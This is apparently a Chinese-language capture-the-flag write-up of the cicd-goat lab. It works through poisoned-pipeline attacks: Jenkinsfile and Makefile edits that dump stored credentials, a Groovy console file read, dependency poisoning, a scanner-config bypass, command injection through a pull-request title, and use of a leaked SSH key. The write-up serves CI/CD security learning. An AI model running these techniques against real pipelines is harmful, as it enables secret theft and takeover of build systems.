
## 从 CICD 漏洞靶场中学习持续集成安全

- - -

漏洞靶场地址：[https://github.com/cider-security-research/cicd-goat](https://github.com/cider-security-research/cicd-goat)

### [靶场介绍](#toc_)

靶场有 CTFd 平台搭建的几个难度的 CI/CD 测试环境，需要得到对应的 Flag 并提交。  
搭建好靶场后，访问 http://localhost:8000/地址并输入 alice 为用户名和密码，即可看到由简单、中等、高等三个不同等级的难度的题目。这里的题目是根据 Cider 提供的 Top10 CI/CD Security Risks 出的对应缺陷靶场 Reference\[1\]。后续我会在解题中对应相关的 Risks 风险。  
[![1656473867604.png](assets/1702372834-fc2af5835d56c2df16781875a11cc6e7.png)](https://storage.tttang.com/media/attachment/2022/07/06/bfa9a854-82bb-402f-ac42-7701ea9f903b.png)  
于此同时，还给出了 Jenkins 和 gitea 的账号密码  
\- Jenkins：[http://localhost:8080](http://localhost:8080/)  
\- Username: `alice`  
\- Password: `alice`  
\- Gitea：[http://localhost:3000](http://localhost:3000/)  
\- Username: `thealice`  
\- Password: `thealice`  
如果你想仔细查看管理员是如何配置的环境，可以使用如下凭据登录后台：  
\- CTFd  
\- Username: `admin`  
\- Password: `ciderland5#`  
\- Jenkins  
\- Username: `admin`  
\- Password: `ciderland5#`  
\- Gitea  
\- Username: `red_queen`  
\- Password: `ciderland5#`

### [Easy](#toc_easy)

#### [White Rabbit](#toc_white-rabbit)

> 我来晚了，我来晚了！没时间说你好，再见！在您被抓之前，请使用您对*Wonderland/white-rabbit*存储库的访问权限来窃取存储在 Jenkins 凭证存储中的*flag1 机密。*  
> 还有两个提示：  
> 1\. 尝试通过存储库触发管道。  
> 2\. 如何使用 Jenkinsfile 访问凭据？  
> 这个题目对应 top10 中的 CICD-SEC-4 Poisoned Pipeline Execution(PPE) 风险，  
> 这类风险通常是存在代码仓库中，可控对应的 CI 管道配置文件，通过修改 CI 配置文件达到执行对应命令的目的。例如 - Jenkinsfile (Jenkins)、.gitlab-ci.yml (GitLab)、.circleci/config.yml (CircleCI)，以及位于 .github/workflows 下的 GitHub Actions YAML 文件。  
> 当黑客提交修改申请的时候，管理员配置好的 WebHook 就会触发对应配置文件，从而执行配置文件中定义的流水线。  
> 而 PPE 风险具体有三种主要类型组成：  
> \- Direct(D-PPE)：在 D-PPE 场景中，攻击者修改他们有权访问的代码仓库中的 CI 配置文件（如 Jenkins 的 Jenkinsfile 文件），通过直接将更改推送到代码仓库上未受保护的远程分支。由于 CI 管道执行是由“push”或“PR”事件触发 WebHook 的，并且管道执行的命令是由修改后的 CI 配置文件中的内容定义的，一旦构建管道被恶意篡改，攻击者的恶意命令最终是会在构建节点中运行、触发。  
> \- Indirect(I-PPE)：如果 CI 的流水线定义不是在代码仓库中的配置文件定义，而是在 CI 系统（Jenkins）自身定义的。仍然可以通过代码仓库中存在的文件进行恶意代码执行，如 Makefile 文件、管道中自定义执行的 shell 脚本。通过间接插入恶意代码到管道中执行的脚本，达到恶意代码植入。  
> \- Public(P-PPE,or 3PE)：从公共的代码仓库拉取的代码，如果攻击者通过公共仓库进行投毒，会对 CI 系统造成破坏，如果 CI 系统在内网，甚至可能进一步危害内网安全。  
> 现在再来看看该题目的解题过程，Jenkins 针对该题目有个对应的 CI 管道，会轮询 Gitea 地址上的项目，这里需要在 Jenkins 的系统配置里面改动下目标地址。  
> [![1656494043869.png](assets/1702372834-36640f9e69cc35e8c599cacd036c7b8c.png)](https://storage.tttang.com/media/attachment/2022/07/06/f1a86843-1967-4427-b96b-cd65ce71dded.png)  
> 接着登录 gitea 访问目标仓库地址，并将项目克隆到本地  
> 修改其中的 Jenkinsfile 内容，添加一个新的 stage 步骤

```bash
stage ('Get_Flags') {
    steps {
        withCredentials([string(credentialsId: 'flag1', variable: 'flag1')]) {
            sh '''
                        echo $flag1 | base64
                    '''                 
        }
    }
}
```

之后通过 git 工具创建一个新的分支，并修改 Jenkinsfile 内容为获取凭证内容

```bash
$ git checkout -b challenge1
$ git add .
$ git commit -m 'first'
$ git push -u origin challenge1
```

之后在页面中提交 PR 合并到 main 里面  
[![1656519607129.png](assets/1702372834-7aa18ec2c0d486199579f80395a23e19.png)](https://storage.tttang.com/media/attachment/2022/07/06/43a38664-db9b-433c-8a7e-26fce1c31590.png)  
至此 Jenkins 上对应的 CI 管道会轮询状态，并把合并的仓库中的 Jenkinsfile 当做 CI/CD 流水线执行  
[![1656519794321.png](assets/1702372834-0c7309646af283df73b840816031b10e.png)](https://storage.tttang.com/media/attachment/2022/07/06/40cd6cb4-a440-4be0-b02e-c2f96ccd8590.png)  
将 base64 内容解密就是 flag 值了

#### [Mad Hatter](#toc_mad-hatter)

> Jenkinsfile 受保护？听起来像是一个生日派对。使用您对*Wonderland/mad-hatter*存储库的访问权限来窃取*flag3*秘密。  
> 这题其实就是间接修改 Makefile 文件内容达到输出 flag，运行的 Jenkinsfile 是一个独立的仓库，无权修改 CI 管道的配置文件，因此改题目的考点是 Indirect(I-PPE)。

```bash
whoami:
    echo "${FLAG}" | base64
```

如上修改再创建分支并合并即可触发 CI/CD 管道。

#### [Duchess](#toc_duchess)

> 如果每个人都关心自己的事情，那么世界会比现在更快地达成交易。它也适用于你的秘密吗？您可以访问*Wonderland/duchess*存储库，该存储库大量使用 Python。公爵夫人非常关心她的凭证的安全性，但一定有一些 PyPi 令牌留在某处......你能找到它吗？  
> 这题其实是考的 CICD-SEC-6 凭证安全  
> 克隆下来的仓库，再通过 https://github.com/zricethezav/gitleaks 检测 git 仓库的隐私信息

```bash
gitleaks detect -v
```

可以检测出仓库有一个 Pypi 的 token  
[![1656603732631.png](assets/1702372834-dc0124bece4c10df6a279478b51a3f5f.png)](https://storage.tttang.com/media/attachment/2022/07/06/998543b4-648b-4b9d-ab50-053f277a55ed.png)  
得到 Flag：pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXNlciIsICJ2ZXJzaW9uIjogMX0AAAYg7T5yHIewxGoh-3st7anbMSCoGhb-U3HnzHAFLHBLNBY

### [Moderate](#toc_moderate)

#### [Caterpillar](#toc_caterpillar)

> 谁。是。你？您只有读取权限……就够了吗？使用您对*Wonderland/caterpillar*存储库的访问权限来窃取存储在 Jenkins 凭证存储中的*flag2 机密。*  
> 以及三个提示：  
> 1\. 分叉存储库并创建拉取请求以触发恶意管道。  
> 2\. 在 Jenkins 作业中执行恶意代码后，哪些环境变量可以帮助您前进？  
> 3\. 从管道中找到 Gitea 访问令牌？伟大的。还有另一个管道是通过推送到主分支来触发的。也许您可以从那里访问标志！  
> 解题思路：  
> 先 fork 仓库，并修改 fork 仓库中的 Jenkinsfile 文件，输出 Jenkins 的环境变量

```bash
stage ('Install_Requirements') {
    steps {
        sh '''
            env
        '''
    }
}
```

然后提交合并到原仓库，触发名字 wonderland-caterpillar-test 的 pipeline  
[![1656742841700.png](assets/1702372834-b873bacdf9291baeedeeb6e7e70fa791.png)](https://storage.tttang.com/media/attachment/2022/07/06/d31162e8-8c78-48d1-ba10-258d9c5a34e7.png)  
在输出的环境变量中可找到 GITEA\_TOKEN  
之后使用该 Gitea 令牌克隆原仓库

```bash
git clone http://5d3ed5564341d5060c8524c41fe03507e296ca46@192.168.249.131:3000/Wonderland/caterpillar.git
```

修改克隆的仓库 Jenkinsfile 文件，输出其中的 Flag

```bash
stage('deploy') {
    steps {
        withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'flag2', passwordVariable: 'TOKEN')]) {
            sh 'echo $TOKEN | base64'
        }
    }
}
```

之后再创建分支并提交、合并，即可触发另一个 wonderland-caterpillar-prod 的管道  
[![1656748696026.png](assets/1702372834-76d74e689f339894b005d9e7c225fcff.png)](https://storage.tttang.com/media/attachment/2022/07/06/c27f9fd9-e57d-4978-9c1c-fc1d719dd37f.png)  
再来看看这两个管道有什么区别，首先是第一个 wonderland-caterpillar-test 的管道，触发该管道需要来自 fork 的合并  
[![1656749156872.png](assets/1702372834-d5f388bc6a85b53cde85e3aa44023471.png)](https://storage.tttang.com/media/attachment/2022/07/06/ba3d89f4-4338-400a-81d2-69e157fcfb49.png)  
但是很遗憾，test 管道里面没有我们要的 flag2 凭据  
但是在 prod 管道里面存在，而触发 prod 管道就需要通过分支的合并才能执行  
[![1656750217893.png](assets/1702372834-1003e30aeef45042aab8059c557ad86b.png)](https://storage.tttang.com/media/attachment/2022/07/06/3898ee33-e9ac-455c-a32c-1396e27436c7.png)  
因此这就是为什么需要通过第一个 test 管道获取仓库的 token，并创建分支再获取 flag2 凭据

#### [Cheshire Cat](#toc_cheshire-cat)

> 您受害者的 Jenkins 实例中的所有作业都在专用节点上运行，但这对您来说还不够好。你很特别。您想在 Jenkins 控制器上执行代码。这才是真正的果汁！使用您对*Wonderland/cheshire-cat*存储库的访问权限在 Controller 上运行代码并从其文件系统中 窃取*~/flag5.txt 。*  
> 再看给出的三个提示：  
> 1\. 尝试执行 Direct-PPE 攻击。  
> 2\. Jenkinsfile 如何指示 Jenkins 在 Controller 上运行作业？  
> 3\. 尝试找到控制器的标签 - “Built-In Node”。

##### [解题思路一](#toc__1)

思路一是一个非预期解，根据题目中所知，可以清楚的知道 flag5.txt 是在节点“Built-In Node”的文件系统上，因此只需要直接执行命令获取该文件内容即可。  
找到对应的节点，在 Script Console 中执行 Groovy 脚本

```bash
println "cat /var/jenkins_home/flag5.txt".execute().text
```

[![1656766856202.png](assets/1702372834-e7b8ef45ee7cb426527162623425b72e.png)](https://storage.tttang.com/media/attachment/2022/07/06/04a38bd7-291c-41a3-8450-ce2b1bb3d092.png)

##### [解题思路二](#toc__2)

这题的解题思路其实还是依靠 Direct-PPE 来指定 CI 系统某个节点上来执行该管道，通常该情况是有仓库的权限，但是无 Jenkins 的节点执行权限。  
克隆仓库，创建分支并修改 Jenkinsfile

```bash
pipeline {
    agent {label 'built-in'}
    environment {
        PROJECT = "sanic"
    }
    stages {
        stage ('Install_Requirements') {
            steps {
                sh 'cat ~/flag5.txt'
            }
        }
    }
    post { 
        always { 
            cleanWs()
        }
    }
}
```

之后就是创建合并请求触发 pipeline 执行  
[![1656816532841.png](assets/1702372834-881ea4da635de2eab0072b024d998c35.png)](https://storage.tttang.com/media/attachment/2022/07/06/6e7b6341-e8ff-44dc-9a91-8e1ceacc189c.png)

#### [Twiddledum](#toc_twiddledum)

> 相反，如果是这样，它可能是；如果是这样，那就是；但事实并非如此，它不是。这就是逻辑。 *Flag6 在**twiddledum*管道中等着你。得到它。  
> 两个提示：  
> 1\. twiddledum 应用程序使用了哪些依赖项？  
> 2\. twiddledee 包是一个依赖项。使用它在 twiddledum 管道中执行恶意代码。  
> 解题过程：  
> 给的 Gitea 环境中好像出了点问题，导致没有 Twiddledum 题目对应的仓库。  
> 在 CICD-Goat 源码中 gitea\\repositories 路径可以找到对应的仓库，将其上传上去，并检测 Jenkins 相关配置是否正确。  
> 题目的考点其实是管道项目的依赖项可能存在供应链攻击，给 twiddledee 依赖项投毒，导致管道的仓库 twiddledum 也执行了相关命令。  
> 因为 twiddledum 依赖了 twiddledee。所以我这里直接修改 twiddledee 的 index.js 内容，添加输出 FLAG6 的内容

```bash
console.log(Buffer.from(process.env.FLAG6).toString("base64"))
```

之后登录 Jenkins 系统，主动触发该管道即可  
[![1656847622983.png](assets/1702372834-48899ca5644a5e6e95637d9417bec1fe.png)](https://storage.tttang.com/media/attachment/2022/07/06/8c743cf7-d347-4414-8755-878b4d9612e6.png)

#### [Dodo](#toc_dodo)

> 每个人都赢了，每个人都必须有奖品！*Dodo*管道正在扫描您。您的任务是让 S3 存储桶公开可读而不会被发现。完成后，在作业的控制台输出中收集您的奖品。  
> 两个提示：  
> 1\. 阅读 Checkov，它是一种防止您弄得一团糟的扫描仪。  
> 2\. 阅读恶意代码分析 Reference\[3\]。  
> 在管道中引入了 SAST 静态扫描工具 checkov：[https://github.com/bridgecrewio/checkov](https://github.com/bridgecrewio/checkov)  
> 在提示 2 中的文章，介绍了 checkov 工具会读取仓库中的.checkov.yml 配置文件作为 checkov 运行的配置，因此可以在仓库中劫持 checkov 的配置。  
> 首先设置 main.tf 的 ACL 为 public-read

```bash
resource "aws_s3_bucket" "dodo" {
  bucket        = var.bucket_name
  acl           = "public-read"     //更改 ACL 设置
  versioning {
    enabled = true
  }
  replication_configuration {
    role = aws_iam_role.replication.arn
    rules {
      id     = "foobar"
      status = "Enabled"
      destination {
        bucket        = aws_s3_bucket.backup.arn
        storage_class = "STANDARD"
      }
    }
  }
}
```

之后创建.checkov.yml，并输入以下内容

```bash
soft-fail: true
check:
  - THIS_NOT_THE_CHECK_YOUR_ARE_LOOKING_FOR
```

[![1656907693465.png](assets/1702372834-7ba470a1c481f11f77dd4335c2335b37.png)](https://storage.tttang.com/media/attachment/2022/07/06/3d17c714-c346-41b9-833e-508bba97e400.png)  
我这里因为环境问题，一直卡在下载安装 hashicorp/aws 组件上，但是可以看到 checkov 检查是绕过了的。

### [Hard](#toc_hard)

#### [Hearts](#toc_hearts)

> 谁偷了那些蛋挞？您的目标是获得*flag8*证书。但没那么快……这些是存储在 Jenkins 上的系统凭据！您将如何访问它？！您可能会发现对管理员代理的权限很有用...  
> 四个提示：  
> 1\. 谁是可以管理代理的 Jenkins 用户？  
> 2\. 您是否已经暴力破解了 Knave Jenkins 用户？  
> 3\. 如果您还没有，Knave 用户密码是 rockme。  
> 4\. 代理可以访问 Jenkins 系统凭据。创建一个代理，使用 flag8 作为其 SSH 凭据，并尝试捕获它。  
> 根据提示可以知道 Knave 是一个 Agent 节点管理员，而 flag 的值就是 SSH 的密码，因此需要搭建一个 SSH 蜜罐 Reference\[4\]来获取对应的密码。  
> [![1656920578949.png](assets/1702372834-c94d10cff3132b5e52515effb98bcd16.png)](https://storage.tttang.com/media/attachment/2022/07/06/8abbd48e-5243-498f-86cb-56c4049b56b0.png)  
> 之后创建一个新的节点，在 Credentials 那里选择 agent 的凭据，之后在蜜罐的日志中看到输出结果  
> [![1656920816851.png](assets/1702372834-9abf1e290747fb9634c04c1b666cae3d.png)](https://storage.tttang.com/media/attachment/2022/07/06/932e3858-78f7-4e62-9f93-61402d17c554.png)

#### [Dormouse](#toc_dormouse)

> “我睡觉时呼吸”和“我呼吸时睡觉”是一回事吗？如果您在破解管道时窃取机密，是否意味着您在窃取机密时也破解了管道？把这些废话放在一边。破解 Dormouse 管道。得到 flag9。祝你好运。  
> 四个提示：  
> 1\. 该 reportcov.sh 脚本的代码存储在哪里？  
> 2\. 访问 Cov 组织下的 reportcov 源代码。您可以在其工件中添加恶意代码吗？  
> 3\. 查看 reportcov 的 Jenkinsfile 并寻找命令注入候选者。  
> 4\. 在 reportcov 存储库中创建拉取请求，并使用标题在其管道中注入代码。  
> 这题给出的环境中一样是有许多问题的，比如 Gitea 中无 reportcov 仓库、仓库的 WebHook 需要自己添加、流水线的输出日志只有管理员账户可以看得到等。这些问题都需要自己重新更改环境。  
> 解题思路其实是在 Jenkinsfile 中有命令注入的缺陷：  
> [![1657006656367.png](assets/1702372834-c16525e1c0d22346ff5b0c4b80d7bbd8.png)](https://storage.tttang.com/media/attachment/2022/07/06/a1f63643-9817-4132-b8f1-495d936c6164.png)  
> 上图中 pipeline 中只有当 webhook 请求过来的 x-gitea-event 是 pull\_request 的 open 事件，才会触发后面的 Send notification 步骤  
> 因为环境有问题，这里还需要设置 WebHook 来触发  
> [![1657011665457.png](assets/1702372834-424be972dc0b4c87f0059f654869b663.png)](https://storage.tttang.com/media/attachment/2022/07/06/e4fe2646-b03f-4866-a2bd-a0a3613de1da.png)  
> 解题步骤：  
> 首先用 thealice 用户 fork 该仓库，并随意更改内容，创建合并请求  
> 在标题那一行注入我们的恶意脚本

```bash
`env`
```

[![1657008430966.png](assets/1702372834-eba49d32dd154de3795538d735668227.png)](https://storage.tttang.com/media/attachment/2022/07/06/a1a8a00e-f688-483d-9226-e47b48a5d106.png)  
登录 Jenkins 系统查看流水线  
[![1657009906167.png](assets/1702372834-5efac53bbfa174211314675a99eadf36.png)](https://storage.tttang.com/media/attachment/2022/07/06/0317e758-e594-440d-a9f1-7d56781d0b2c.png)  
可以看到环境列表里面的 Key 是 SSH 的私钥，对应流水线里面的代码：

```bash
stage ('Deploy') {
    steps {
        sh "set +x && echo \"${KEY}\" > key && chmod 400 key && set -x"
        sh 'scp -o StrictHostKeyChecking=no -i key reportcov.sh root@lighttpd:/var/www/localhost/htdocs'
    }
}
```

将私钥保存在名为 key 的文件里，并设置属性为 400

```bash
$ chmod 400 key
$ ssh -p 2222 -i key root@192.168.249.131
```

登录目标系统，直接查看 FLAG  
但是我这里不知道为啥一直找不到 FLAG，不论是 CI 管道中，还是拿到 SSH 私钥的 goat-lighttpd 服务上，都没有见到 FLAG 的身影。不过实验的目的还是达到了，成功操控了目标 CI 管道并获取权限。

#### [Mock Turtle](#toc_mock-turtle)

> 你见过假海龟吗？这就是模拟乌龟汤的原料。你能推送到 mock-turtle repo 的主分支吗？采取必要措施窃取存储在 Jenkins 凭证存储中的 flag10 机密。  
> 两个提示：  
> 1\. 查看 Jenkinsfile 条件。它们可以被绕过吗？  
> 2\. 第一个条件检查拉取请求中没有添加新词。  
> 先来看看仓库中的 Jenkinsfile，这里做个三个 check 检查

```bash
pipeline {
    agent any
    stages {
        stage('pr_checks') {
            steps {
                withCredentials([usernamePassword(credentialsId: 'mock-turtle-token', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
                    sh '''
                        PR_ID=`echo "$CHANGE_URL" | grep -Po '^http://192.168.249.131:3000/Wonderland/mock-turtle/pulls/\\K\\d+$'`
                        if [ $? -eq 0 ];
                        then
                            gitp=`git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^+[^+]" | wc -w | xargs`
                            gitm=`git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^-[^-]" | wc -w | xargs`      
                            if [ $(($gitp - $gitm)) -eq 0 ] ; then check1=true; else check1=false; fi
                            if [ $(wc -l <version) -eq 0 -a $(grep -Po "^\\d{1,2}\\.\\d{1,2}\\.\\d{1,2}$" version) ] ; then check2=true; else check2=false; fi
                            if [ $(git diff --name-only origin/${CHANGE_TARGET} | grep version) ] ; then check3=true; else check3=false; fi
                            if $check1 && $check2 && $check3;
                            then
                                curl -X 'POST' \
                                'http://192.168.249.131:3000/api/v1/repos/Wonderland/mock-turtle/pulls/'"$PR_ID"'/merge' \
                                -H 'accept: application/json'\
                                -H 'Content-Type: application/json' \
                                -H 'Authorization: token '"$TOKEN" \
                                -d '{
                                    "Do": "merge"
                                }';
                            else
                                echo 'skipping...';
                            fi
                        fi
                    '''
                }
            }
        }
    }
}
```

用 git diff 判断了三个 check，如果满足三个条件，就发送 POST 请求  
1\. git diff 更改的时候，删除了一行并添加一行的单词，git diff 就认为是删除了 0 行内容，因此可以用来绕过第一个限制  
2\. 检查了 version 中的版本结构是否小于更改后的版本  
3\. 检查 version 文件是否改变  
我根据官网给出的修改方案进行修改，如下图所示：  
[![1657077784840.png](assets/1702372834-ad2b9c5d1d13b5e56ec21dbf538eaafb.png)](https://storage.tttang.com/media/attachment/2022/07/06/feb4a160-5d91-430d-b6c0-861bdc365d0d.png)  
克隆到本地后创建新的分支并提交到 main 分支  
[![1657078267770.png](assets/1702372834-a2ad7f0852b98281e749ccee91e36892.png)](https://storage.tttang.com/media/attachment/2022/07/06/0697c052-593a-47ce-b4ac-a737a4259c8c.png)  
之后触发的流水线中也可以看到，三个检查都是顺利通过，并发送了 Post 请求来合并。  
如果在合并过程中出现无权限合并  
[![1657081323955.png](assets/1702372834-85d571027246886d3b18ba317080efdb.png)](https://storage.tttang.com/media/attachment/2022/07/06/b8e225af-334c-44a4-baa9-81fb1ac6701f.png)  
需要手动在仓库中把“mock-turtle-ci”用户也加入到仓库管理中。  
[![1657081501572.png](assets/1702372834-4fdc559b45a7f8082d1460641d5868da.png)](https://storage.tttang.com/media/attachment/2022/07/06/d3dd8f60-0cb5-4c5e-84f1-12692769eefd.png)  
此时 main 分支的 Jenkinsfile 就被我们更改了  
之后再触发针对 main 分支的管道，得到 flag  
[![1657081430954.png](assets/1702372834-d59e7fbcfa5df93c38020493300b2896.png)](https://storage.tttang.com/media/attachment/2022/07/06/9c63bb56-9ef6-4201-9111-fda26d19c4db.png)

### [结束语](#toc__3)

随着敏捷开发和微服务的普及，越来越多的企业生产环境中都应用了 CI/CD 来部署。这也导致很多的攻击面暴露出来，因此需要更加注重管道的安全性。Cider 安全研究团队提供的 cicd-goat 正好可以提供给安全研究人员学习这方面的知识。我也是在某个偶然机会学习 SAST/IAST 安全产品在 DevSecOps 中的应用时接触的管道部署方式，这种开发模式大大提高了开发人员的效率和产品的迭代。  
虽然环境还是有些许问题和不足，但是全是笔者一步一步慢慢摸索出来的，不断修复环境并且达到更加真实的实验步骤呈现出来。

### [Reference](#toc_reference)

\[1\].[https://www.cidersecurity.io/top-10-cicd-security-risks/](https://www.cidersecurity.io/top-10-cicd-security-risks/)  
\[2\].[https://github.com/cider-security-research/cicd-goat](https://github.com/cider-security-research/cicd-goat)  
\[3\].[https://www.cidersecurity.io/blog/research/malicious-code-analysis-abusing-sast-misconfigurations-to-hack-ci-systems/](https://www.cidersecurity.io/blog/research/malicious-code-analysis-abusing-sast-misconfigurations-to-hack-ci-systems/)  
\[4\].[https://github.com/internetwache/SSH-Honeypot](https://github.com/internetwache/SSH-Honeypot)
